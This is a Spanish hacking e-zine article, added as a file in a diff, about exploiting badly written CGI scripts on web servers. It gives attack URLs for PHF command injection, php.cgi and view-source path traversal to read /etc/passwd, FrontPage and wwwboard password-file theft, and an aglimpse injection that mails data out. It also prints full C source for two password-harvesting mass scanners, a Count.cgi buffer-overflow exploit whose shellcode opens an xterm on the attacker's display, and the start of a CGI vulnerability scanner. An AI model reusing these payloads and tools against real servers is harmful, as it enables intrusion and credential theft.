@@ -1,0 +1,957 @@
+ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
+º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
+ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
+º11.- Jugando con los CGI's    º       Hacking      º       Medio/Bajo      º
+ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
+                                                                    [ IReik ]
+                                                                                               
+INTRODUCCION
+~~~~~~~~~~~~
+
+Vale, entonces, ?de que trata este texto?, bueno pues voy a intentar explicar
+como podemos aprovecharnos de la mala programacion de un cgi para leer
+archivos de la maquina objetivo, ver informacion acerca de la maquina
+objetivo... pero para todo eso tendras que seguir leyendo.
+
+Asi, pues, aqui hay una peque¤a (en realidad muy peque¤a) recopilacion de
+fallos de algunos cgi que nos pueden ayudar a hacer mas facil el hack, ya que
+a veces encontramos un server con una seguridad medi-baja y donde no sabemos
+que hacer y sin embargo, resulta que nos han dejado la puerta de delante
+abierta :)
+
+Continuo advirtiendo que algunos (o bastantes) de los bugs o vulnerabilidades
+que se presentan en este texto son algo antiguas y necesitaremos algo de
+paciencia para encontrar un host vulnerable y utilizaremos el netscape para
+explotar algunas vulnerabilidades desde el navegador (si, si el phf tambien).
+
+Bueno, pues antes de seguir, deciros que en esta peque¤a recopilacion solo he incluido fallos que yo he explotado (porsupuesto nada ilegal) o tengo constancia de su funcionamiento (del fallo jeje) y por lo tanto se que funcionan, asi que lo siento si la lista es corta, pero para aquellos que esto les sepa a poco al final teneis un apartado con una serie de links donde encontrareis recopilaciones de bugs y porsupuesto estaran los errores en cgi's y como explotarlos, ademas se incluyen herramientas (o la direccion para encontrarlas) que escanean el host objetivo buscando este tipo de fallos y nos seran de gran utilidad :)
+
+
+LA CHICHA
+~~~~~~~~~
+
+1.-PHF
+
+Bueno, este ya esta mas que visto pero no podia faltar en un articulo desde
+este tipo y nada, para explotar este fallo lo unico que tenemos que hacer es
+incluir esta linea en el navegador:
+
+<a href="http://host.objetivo.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd" target=nlink>http://host.objetivo.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd</a>
+
+Este bug esta ya mas que explicado pero para el que no sepa nada esta linea
+nos sacara en pantalla el fichero de passwords del host objetivo, porsupuesto
+podemos visualizar otros archivos pero creo que lo que mas nos interesa es
+este ¨no? :) Vale, para los mas curiosos , tambien podemos probar algo como:
+
+<a href="http://host.objetivo.com/cgi-bin/phf?Qalias=x%0a/bin/ls%20/" target=nlink>http://host.objetivo.com/cgi-bin/phf?Qalias=x%0a/bin/ls%20/</a>
+
+Supongo que todo el mundo sabe para que sirve la orden ls y si no le echamos
+un vistazo al curso de unix que escribe Ripe en este mismo ezine :)
+
+Asi pues este bug tambien nos permite, como hemos visto, ejecutar comandos en
+la maquina remota, como, por ejemplo, un useradd, simplemente hace falta
+imaginacion ;)
+
+Bueno, advierto que encontrar hosts donde podamos explotar este fallo es
+mucho mas que dificil, pero un estudio de hace no mucho tiempo por parte de
+Hispasec, nos informaba de que aun miles de servers en el mundo eran
+vulnerables a este fallo.
+
+Para facilitaros la tarea de encontrar este fallo en host remoto os pego aqui
+un escaner para esta vulnerabilidad escrito en C.
+
+--------------------------------cortar aqui----------------------------------
+/*        phfscan.c
+     June, 1996
+     By Alhambra
+     <a href="/Mail-Bin/send_mail.form?TO=alhambra@infonexus.com">alhambra@infonexus.com</a>
+     A production of The Guild Corporation, 1996
+	A quick hack to make scanning for hosts which still have the phf bug.
+     Accepts hosts to scan from stdin, and writes whatever it gets back to
+     stdout.  Plenty of room for optimization, and features that could be 
+     added include forking off multiple copies for concurrent scans, etc, etc.
+     Do it yourself...that's how you learn.
+
+     The effectiveness of this program for getting password files isn't
+     what it once was...we see only around a 30% success ratio at getting
+     /etc/passwd from hosts that would have been vulnerable once upon a time.
+     But that's still something...
+         Use:	phfscan < infile > outfile
+*/
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <termios.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/syslog.h>
+#include <sys/param.h>
+#include <sys/times.h>
+#ifdef LINUX
+#include <sys/time.h>
+#endif
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/signal.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+int FLAG = 1;
+int Call(int signo)
+{
+ FLAG = 0;
+}
+main (int argc, char *argv[])
+{
+  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
+  int outsocket, serv_len, len,X,c,outfd;
+  struct hostent *nametocheck;
+  struct sockaddr_in serv_addr;
+  struct in_addr outgoing;
+  char PHFMessage[]="GET /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd\n";
+  /* yp version...use as needed...*/
+/* char PHFMessage[]="GET /cgi-bin/phf?Qalias=x%0a/usr/bin/ypcat%20passwd\n";*/
+
+  while(fgets(hosta,100,stdin))
+    {
+      if(hosta[0] == '\0')
+	break;
+      hosta[strlen(hosta) -1] = '\0';
+      write(1,hosta,strlen(hosta)*sizeof(char));
+	write(1,"\n",sizeof(char));
+      outsocket = socket (AF_INET, SOCK_STREAM, 0);
+      memset (&serv_addr, 0, sizeof (serv_addr));
+      serv_addr.sin_family = AF_INET;
+     
+      nametocheck = gethostbyname (hosta);
+
+      /* Ugly stuff to get host name into inet_ntoa form */
+      (void *) memcpy (&outgoing.s_addr, nametocheck->h_addr_list[0],
+		       sizeof (outgoing.s_addr));
+      strcpy (host, inet_ntoa (outgoing));
+      serv_addr.sin_addr.s_addr = inet_addr (host);
+      serv_addr.sin_port = htons (80);
+      signal(SIGALRM,Call);
+      FLAG = 1;
+
+      alarm(10);
+    
+      X=connect (outsocket, (struct sockaddr *) &serv_addr, sizeof (serv_addr));
+      alarm(0);
+
+      if(FLAG == 1 && X==0){
+       write(outsocket,PHFMessage,strlen(PHFMessage)*sizeof(char));
+       while((X=read(outsocket,FileBuf,8096))!=0)
+	  write(1,FileBuf,X);
+	}
+      close (outsocket);
+       }
+  return 0;
+}
+
+--------------------------------cortar aqui----------------------------------
+
+
+2.-PHP
+
+Otro viejo, viejo y dificil, dificil de encontrar pero como en el caso
+anterior seria pecado no nombrarlo aqui, este es otro fallo que podemos
+explotar desde el mismo netscape y nos permitira leer archivos de la maquina
+objetivo, para ello introducimos la siguiente linea en el navegador:
+
+<a href="http://host.objetivo.com/cgi-bin/php.cgi?/etc/passwd" target=nlink>http://host.objetivo.com/cgi-bin/php.cgi?/etc/passwd</a>
+
+Y de nuevo, cortar, pegar y a correr un crackeador de passwords. 
+
+El php.cgi, es ademas, en su version 2.0beta10 (para saber la version del
+phf, algo tan facil como <a href="http://host.objetivo.com/cgi-bin/php.cgi"
+target=nlink>http://host.objetivo.com/cgi-bin/php.cgi</a> y esperar el
+resultado) vulnerable a un buffer overflow que explotamos remotamente y que
+nos da una cuenta shell en el host objetivo
+
+Como este es un cgi tambien famoso :) se hicieron escaners que buscaban el
+php.cgi vulnerable en host remoto, aqui os dejo el codigo fuente del escaner
+listo para compilar y ser utilizado:
+
+---------------------------------cortar aqui---------------------------------
+/*  phpscan.c : php.cgi vunerable server scanning program.
+  Basically a phf scanner, by Alhambra of
+  The Guild Corperation, optimise as you wish..
+
+  Modifed by <a href="/Mail-Bin/send_mail.form?TO=so1o@insecurity.org">so1o@insecurity.org</a> of CodeZero.
+
+  Usage:
+	phpscan < infile > outfile
+
+*/
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <termios.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/syslog.h>
+#include <sys/param.h>
+#include <sys/times.h>
+#ifdef LINUX
+#include <sys/time.h>
+#endif
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/signal.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+int FLAG = 1;
+int Call(int signo)
+{
+ FLAG = 0;
+}
+main (int argc, char *argv[])
+{
+  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
+  int outsocket, serv_len, len,X,c,outfd;
+  struct hostent *nametocheck;
+  struct sockaddr_in serv_addr;
+  struct in_addr outgoing;
+
+  char PHPMessage[]="GET cgi-bin/php.cgi?/etc/passwd\n";
+
+  while(fgets(hosta,100,stdin))
+    {
+      if(hosta[0] == '\0')
+      break;
+      hosta[strlen(hosta) -1] = '\0';
+      write(1,hosta,strlen(hosta)*sizeof(char));
+      write(1,"\n",sizeof(char));
+      outsocket = socket (AF_INET, SOCK_STREAM, 0);
+      memset (&serv_addr, 0, sizeof (serv_addr));
+      serv_addr.sin_family = AF_INET;
+     
+      nametocheck = gethostbyname (hosta);
+
+      (void *) memcpy (&outgoing.s_addr,       nametocheck->h_addr_list[0],sizeof     (outgoing.s_addr));
+      strcpy (host, inet_ntoa (outgoing));
+      serv_addr.sin_addr.s_addr = inet_addr (host);
+      serv_addr.sin_port = htons (80);
+      signal(SIGALRM,Call);
+      FLAG = 1;
+
+      alarm(10);
+    
+      X=connect (outsocket, (struct sockaddr *)       &serv_addr, sizeof (serv_addr));
+      alarm(0);
+
+      if(FLAG == 1 && X==0){
+       write(outsocket,PHPMessage,strlen(PHPMessage)*sizeof(char));
+       while((X=read(outsocket,FileBuf,8096))!=0)         write(1,FileBuf,X);
+       }
+       close (outsocket);
+
+       }
+  return 0;
+}
+
+---------------------------------cortar aqui---------------------------------
+
+
+3.-SERVICE.PWD O FRONTPAGE
+
+Bueno, este es bug es mas facil de encontrar que los anteriores, primero
+procedemos a encontrar un server con las extensiones del frontpage
+instaladas, algo harto facil si tenemos en cuenta que cuando se instalan
+podremos acceder a:
+
+<a href="http://host.objetivo.com/_vti_bin/" target=nlink>http://host.objetivo.com/_vti_bin/</a>
+
+Bueno pues ahora accedemos al siguiente directorio del host ,desde el
+navegador, porsupuesto:
+
+<a href="http://host.objetivo.com/_vti_pvt_/" target=nlink>http://host.objetivo.com/_vti_pvt_/</a>
+
+y buscamos archivos de extension .pwd (por defecto service.pwd) ahora un
+click y anda el nombre de usuario y la contrase¤a encriptada que nos
+permitiran hacer modificaciones en la web del server desde nuestro frontpage,
+¨lo quereis mas facil?
+
+
+4.-QUERYHIT.HTML O WEBHITS.EXE (para servers que rulen M$)
+
+¨Y esto que es?, bueno pues os estoy hablando de lo peligroso que puede
+llegar a ser implantar un buscador en la pagina web. Si nos encontramos en un
+server un buscador de archivos en el servidor, para comprobarlo simplemente:
+
+<a href="http://host.objetivo.com/samples/search/queryhit.htm" target=nlink>http://host.objetivo.com/samples/search/queryhit.htm</a>
+
+					o
+
+<a href="http://host.objetivo.com/scripts/samples/search/webhits.exe" target=nlink>http://host.objetivo.com/scripts/samples/search/webhits.exe</a>
+
+Ahora que tal si buscamos archivos de passwords, es algo tan facil como
+realizar la siguiente busqueda #filename=*.xxx  donde xxx es la extension del
+tipo de archivos que queremos que nos busque dentro del sitio, por ejemplo,
+si queremos buscar passwords del frontpage escribimos #filename=*.pwd
+
+
+5.-COUNT.CGI
+
+Este cgi, muy abundante en los servers, es vulnerable, en algunas de sus
+versiones a un ataque remoto, mediante el xploit que os pego aqui abajo, eso
+si, encontrar versiones vulnerables es algo dificil, pero bueno ahi esta.
+
+--------------------------------cortar aqui----------------------------------
+/*#################################################################
+###################################################################
+##   count.cgi.l.c -  intel linux exploit for Count.cgi
+##   Gus/97
+##   Shell code blatantly stolen from 'wwwcount.c' by 
+##   Plaguez <<a href="/Mail-Bin/send_mail.form?TO=dube0866@eurobretagne.fr">dube0866@eurobretagne.fr</a>>
+##      
+##   Spawns an xterm on your $DISPLAY, or override on command
+##   line.
+##
+##
+*/
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <getopt.h>
+#include <unistd.h>
+/* Forwards */
+unsigned long getsp(int);
+int usage(char *);
+void doit(long, char *);
+
+/* Constants */
+char shell[]=
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\xeb\x3c\x5e\x31\xc0\x89\xf1\x8d\x5e\x18\x88\x46\x2c\x88\x46\x30"
+"\x88\x46\x39\x88\x46\x4b\x8d\x56\x20\x89\x16\x8d\x56\x2d\x89\x56"
+"\x04\x8d\x56\x31\x89\x56\x08\x8d\x56\x3a\x89\x56\x0c\x8d\x56\x10"
+"\x89\x46\x10\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xbf"
+"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+"/usr/X11R6/bin/xterm0-ut0-display0";
+char endpad[]=
+"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";
+
+
+
+
+int main (int argc, char *argv[]){
+  char *shellcode;
+  int cnt,ver;
+  unsigned long sp;
+  int retcount;
+  int dotquads[4];
+  int dispnum;
+  char displaynamebuf[255];
+
+
+  sp = cnt = ver = 0;
+  fprintf(stderr,"\tcounterterm - Gus\n");
+  if (argc<3) usage(argv[0]);
+
+  while ((cnt = getopt(argc,argv,"d:v:")) != EOF) {
+    switch(cnt){
+    case 'd':
+      {
+	retcount = sscanf(optarg, "%d.%d.%d.%d:%d",
+ 			  &dotquads[0],
+			  &dotquads[1],
+			  &dotquads[2],
+			  &dotquads[3], &dispnum);
+	if (retcount != 5) usage(argv[0]);
+	sprintf(displaynamebuf, "%03d.%03d.%03d.%03d:%01d", 
+		dotquads[0], dotquads[1], dotquads[2],dotquads[3], dispnum);
+	shellcode=malloc(strlen((char *)optarg)+strlen(shell)+strlen(endpad));
+	sprintf(shellcode,"%s%s%s",shell,displaynamebuf,endpad);
+      }
+    break;
+    case 'v':
+      ver = atoi(optarg);
+      printf("Ver is %d\n",ver);
+      break;
+    default:
+      usage(argv[0]);
+      break;
+    }
+  }
+
+  
+  sp = getsp(ver);
+
+    (void)doit(sp,shellcode);
+
+  exit(0);
+}
+
+unsigned long getsp(int ver) {
+  /* Get the stack pointer we should be using. This is version specific, and,
+  ** as with all buffer overruns is more of a pointer than a precise value.
+  */
+    unsigned long sp=0;
+
+  if (ver == 15) sp = 0xFFFFFF;
+  if (ver == 20) sp = 0XFFFFFF;
+  if (ver == 22) sp = 0xbfffa0b4;
+  if (ver == 23) sp = 0xbfffee38;
+  if (sp == 0) {
+    fprintf(stderr,"That version is not vulnerable.\n");
+    exit(1);
+  } else {
+    fprintf(stderr,"\tUsing offset 0x%x\n",sp);
+    return sp;
+  }
+}
+int usage (char *name) {
+  fprintf(stderr,"\tUsage:%s -d <display> -v <version>\n",name);
+  fprintf(stderr,"\te.g. %s -d 127.0.0.1:0 -v 22\n",name);
+  exit(1);
+}
+
+
+void doit (long sp, char *shellcode) {
+  int cnt;
+  char qs[7000];
+  char chain[] = "user=a";
+
+      for(cnt=0;cnt<4104;cnt+=4) {
+   qs[cnt+0] = sp &  0x000000ff;
+   qs[cnt+1] = (sp & 0x0000ff00) >> 8;
+   qs[cnt+2] = (sp & 0x00ff0000) >> 16;
+   qs[cnt+3] = (sp & 0xff000000) >> 24;
+  }
+  strcpy(qs,chain);
+  qs[strlen(chain)]=0x90;
+
+  qs[4104]= sp&0x000000ff;
+  qs[4105]=(sp&0x0000ff00)>>8;
+  qs[4106]=(sp&0x00ff0000)>>16;
+  qs[4107]=(sp&0xff000000)>>24;
+  qs[4108]= sp&0x000000ff;
+  qs[4109]=(sp&0x0000ff00)>>8;
+  qs[4110]=(sp&0x00ff0000)>>16;
+  qs[4111]=(sp&0xff000000)>>24;
+  qs[4112]= sp&0x000000ff;
+  qs[4113]=(sp&0x0000ff00)>>8;
+  qs[4114]=(sp&0x00ff0000)>>16;
+  qs[4115]=(sp&0xff000000)>>24;
+  qs[4116]= sp&0x000000ff;
+  qs[4117]=(sp&0x0000ff00)>>8;
+  qs[4118]=(sp&0x00ff0000)>>16;
+  qs[4119]=(sp&0xff000000)>>24;
+  qs[4120]= sp&0x000000ff;
+  qs[4121]=(sp&0x0000ff00)>>8;
+  qs[4122]=(sp&0x00ff0000)>>16;
+  qs[4123]=(sp&0xff000000)>>24;
+  qs[4124]= sp&0x000000ff;
+  qs[4125]=(sp&0x0000ff00)>>8;
+  qs[4126]=(sp&0x00ff0000)>>16;
+  qs[4127]=(sp&0xff000000)>>24;
+  qs[4128]= sp&0x000000ff;
+  qs[4129]=(sp&0x0000ff00)>>8;
+  qs[4130]=(sp&0x00ff0000)>>16;
+  qs[4131]=(sp&0xff000000)>>24;
+    strcpy((char*)&qs[4132],shellcode);
+
+  
+  fprintf(stderr,"GET /cgi-bin/counter?%s\n\n",qs);
+
+
+  setenv("HTTP_USER_AGENT",qs,1);
+  setenv("QUERY_STRING",qs,1);
+  system("./Count.cgi");
+
+}
+---------------------------------cortar aqui---------------------------------
+
+
+6.-WWWBOARD
+
+Esta herramienta que nos sirve para crear foros de discusion en paginas webs
+esta afectada por una grave vulnerabilidad, y es que nos permite leer el
+login y el password (encriptado) del administrador del foro. Para conseguir
+esa informacion simplemente has de introducir la siguiente liena en el
+navegador:
+
+<a href="http://host.objetivo.com/wwwboard/passwd.txt" target=nlink>http://host.objetivo.com/wwwboard/passwd.txt</a>
+
+
+7.-TEST-CGI
+
+Pues nada, si nos encontramos un servidor con el test-cgi podemos intentar la
+siguiente url que nos dara informacion valiosa acerca de la maquina objetivo,
+ya que nos dara un listado de los directorios en la raiz, con lo cual podemos
+hacernos una idea de que software tiene instalado y podemos buscar si ese
+software tiene alguna vulnerabilidad que nos pueda ayudar en nuestra tarea,
+asi pues, simplemente hacemos:
+
+<a href="http://host.objetivo.com/test-cgi?/" target=nlink>http://host.objetivo.com/test-cgi?/</a>*
+
+
+8.-NPH-TEST-CGI
+
+Parecido al anterior, este tambien nos hace un listado de directorios, con lo
+cual tambien nos ayuda, este cgi a conseguir informacion valiosa de la
+maquina simplemente con escribir en el navegador:
+
+<a href="http://host.objetivo.com/nph-test-cgi?/" target=nlink>http://host.objetivo.com/nph-test-cgi?/</a>*
+
+Veamos un ejemplo que lo deje mas claro, en un server vurnerable hacemos
+
+<a href="http://host.objetivo.com/nph-test-cgi" target=nlink>http://host.objetivo.com/nph-test-cgi</a>
+
+y obtenemos
+
+CGI/1.0 test script report:
+
+argc is 0. argv is .
+
+SERVER_SOFTWARE = Apache/1.2.0
+SERVER_NAME = omitido a proposito, aqui va la direccion del server
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/1.0
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT = image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /cgi-bin/nph-test-cgi
+QUERY_STRING =
+REMOTE_HOST = Ip remota omitida a propósito
+REMOTE_ADDR = Ip remota omitida a propósito
+REMOTE_USER =
+CONTENT_TYPE =
+CONTENT_LENGTH =
+
+Esto no nos da nada interesante, pero fijaros que pasa en la cadena
+query_string si hacemos lo siguiente:
+
+<a href="http://host.objetivo.com/nph-test-cgi?/" target=nlink>http://host.objetivo.com/nph-test-cgi?/</a>*
+
+CGI/1.0 test script report:
+
+argc is 1. argv is /\*.
+
+SERVER_SOFTWARE = Apache/1.2.0
+SERVER_NAME = omitido a proposito, aqui va la direccion del server
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/1.0
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT = image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /cgi-bin/nph-test-cgi
+QUERY_STRING = /System.81 /System.map /System.old /bin /boot /bzImage /bzimage.new /cdrom /dev /etc /home /lib /lost+found /mnt /mount /proc /quota.group /quota.user /root /sbin /shlib /tmp /usr /var /vmlinuz /vmlinuz.3com+ncr /vmlinuz.dtp /vmlinuz.ncr+riscom
+REMOTE_HOST = Ip remota omitida a propósito
+REMOTE_ADDR = Ip remota omitida a propósito
+REMOTE_USER =
+CONTENT_TYPE =
+CONTENT_LENGTH =
+
+vaya vaya pero que tenemos en QUERY_STRING, si resulta que es como hacer un
+ls en la raiz :)
+
+y aun podemos probar algo como:
+
+<a href="http://host.objetivo.com/cgi-bin/nph-test-cgi?" target=nlink>http://host.objetivo.com/cgi-bin/nph-test-cgi?</a>*/
+
+y obtenemos
+
+CGI/1.0 test script report:
+
+argc is 1. argv is \*/.
+
+SERVER_SOFTWARE = Apache/1.2.0
+SERVER_NAME = omitido a proposito, aqui va la direccion del server
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/1.0
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT = image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /cgi-bin/nph-test-cgi
+QUERY_STRING = dns/ form_test/ formgen/ sec-cgi/ shared/ test/
+REMOTE_HOST = Ip remota omitida a propósito
+REMOTE_ADDR = Ip remota omitida a propósito
+REMOTE_USER =
+CONTENT_TYPE =
+CONTENT_LENGTH 
+
+fijaros como vuelve a cambiar la cadena QUERY_STRING :))
+
+
+9.-OTROS
+
+Bueno, bufff, para no llenar mas el articulo os incluyo aqui este cajon de
+sastre donde pongo otros ejemplos de cgi's vulnerables a un ataque remoto, de
+estos hay muchos, pero como no es plan de comentarlos todos aqui os pongo
+aqui ejemplos de algunos que me han dicho que funcionan seguro (o lo he
+probado yo mismo) y en la seccion de links podras encontrar webs que si
+tienen una buena coleccion de este tipo de vulnerabilidades
+
+ -AGLIMPSE
+
+Para explotar este CGI hacemos algo como:
+telnet host.objetivo.com 80
+ GET /cgi-bin/aglimpse/80|IFS=5;CMD=5mail5tu_direccion\@tu_host.com\
+
+ -CONVERT.BAS
+
+Introducimos la siguiente linea en el navegador:
+
+<a href="http://host.objetivo.com/scripts/convert.bas?../../etc/passwd" target=nlink>http://host.objetivo.com/scripts/convert.bas?../../etc/passwd</a>
+
+ -FINGER
+
+Este es interesante, en algunos servers podemos encontrar un servicio de
+finger, es decir para hacer finger a hosts remotos desde la web, y nosotros
+usaremos ese cgi para conseguir valiosa informacion del host donde esta
+hospedada la web, simplemente hemos de poner esta linea en el navegador
+
+<a href="http://host.objetivo.com/cgi-bin/finger?@localhost" target=nlink>http://host.objetivo.com/cgi-bin/finger?@localhost</a>
+
+ -VIEWSOURCE
+
+Pues nada, mas de lo mismo, abritmos netscape navigator y:
+
+	<a href="http://host.objetivo.com/cgi-bin/view-source?../../../../../../../etc/passwd" target=nlink>http://host.objetivo.com/cgi-bin/view-source?../../../../../../../etc/passwd</a>
+
+
+CONCLUSION, LINKS Y HERRAMIENTAS
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Bueno, hasta aqui hemos llegado,desde luego no estan todos los que son, pero
+espero que este texto haya cumplido su objetivo, que es introducir a la gente
+al "maravilloso mundo de las vulnerabilidades en CGI's", como vemos, a veces
+algo tan sencillo de explotar como un CGI nos puede dar acceso de root en un
+server donde quizas habiamos provado ya sin exito algunas tecnicas de ataque.
+Y es que cada vez el hacking se esta haciendo mas dificil y es conveniente, o
+almenos eso creo, explorar todas las posibilidades, ademas espero (si, si,
+esperar es lo mio) que no se utilizen algunos medios aqui expuestos para
+simplemente conseguir modificar la pagina de algun server llevado por un
+admin novato, pues nuestro objetivo es aprender y por que no, divertirnos, no
+dar dolores de cabeza a un admin descuidado :)
+
+Bueno, ademas ahora me gustaria incluiros aqui el codigo fuente de un escaner
+para este tipo de vulnerabilidades, que se lo podeis pasar a un host para
+enteraros si tiene algun cgi vulnerable, desde luego esto facilita el trabajo
+:)
+
+----------------------------------corta aqui---------------------------------
+/* ---------------------------------------------------------------------- */
+/* CGI scanner v1.35, m0dify and recode by su1d sh3ll //UnlG 1999         */
+/* Tested on Slackware linux with kernel 2.0.35;RH 5.2(2.0.36);           */
+/*           FreeBSD 2.2.2-3.1;IRIX 5.3                                   */
+/* Source c0de by [CKS & Fdisk]                                           */
+/* gr33tz to: Packet St0rm and Ken, ADM crew, ech0 security and CKS, ch4x,*/
+/*            el8.org users, #c0de, rain.forest.puppy/[WT], MnemoniX ,    */
+/*            hypoclear of lUSt,codex ;-) , K.A.L.U.G.                    */
+/* fuck to: www.hackzone.ru , HDT...  CHC fuck u 2 , llamaz               */
+/*          NATO and bill klinton  <---- double fuck! :-) huh             */
+/* c0ming s00n: add-on for CGI scanner - for scan "C" class subnet & logs */
+/* -----------------------------------------------[10:01 17.05.99  UnlG]- */
+
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <ctype.h>
+#include <arpa/nameser.h>
+#include <sys/stat.h>
+#include <strings.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+
+void main(int argc, char *argv[])
+{
+ int sock,debugm=0;
+ struct in_addr addr;
+ struct sockaddr_in sin;
+ struct hostent *he;
+ unsigned long start;
+ unsigned long end;
+ unsigned long counter;
+ char foundmsg[] = "200";
+ char *cgistr;
+ char buffer[1024];
+ int count=0;
+ int numin,suxes=0;
+ char cgibuff[1024];
+ char *buff[100];    /* Don't u think 100 is enought?  ;-)*/
+ char *cginame[100]; /* Don't u think 100 is enought? */
+
+ buff[1] = "GET /cgi-bin/unlg1.1 HTTP/1.0\n\n";
+
+ /* v0rt-fu when u modify source, check this first line.... that's my 8-)   */
+
+ buff[2] = "GET /cgi-bin/rwwwshell.pl HTTP/1.0\n\n";
+ buff[3] = "GET /cgi-bin/phf HTTP/1.0\n\n";    
+ buff[4] = "GET /cgi-bin/Count.cgi HTTP/1.0\n\n";
+ buff[5] = "GET /cgi-bin/test-cgi HTTP/1.0\n\n";
+ buff[6] = "GET /cgi-bin/nph-test-cgi HTTP/1.0\n\n";
+ buff[7] = "GET /cgi-bin/nph-publish HTTP/1.0\n\n";
+ buff[8] = "GET /cgi-bin/php.cgi HTTP/1.0\n\n";
+ buff[9] = "GET /cgi-bin/handler HTTP/1.0\n\n";
+ buff[10] = "GET /cgi-bin/webgais HTTP/1.0\n\n";
+ buff[11] = "GET /cgi-bin/websendmail HTTP/1.0\n\n";
+ buff[12] = "GET /cgi-bin/webdist.cgi HTTP/1.0\n\n";
+ buff[13] = "GET /cgi-bin/faxsurvey HTTP/1.0\n\n";
+ buff[14] = "GET /cgi-bin/htmlscript HTTP/1.0\n\n";
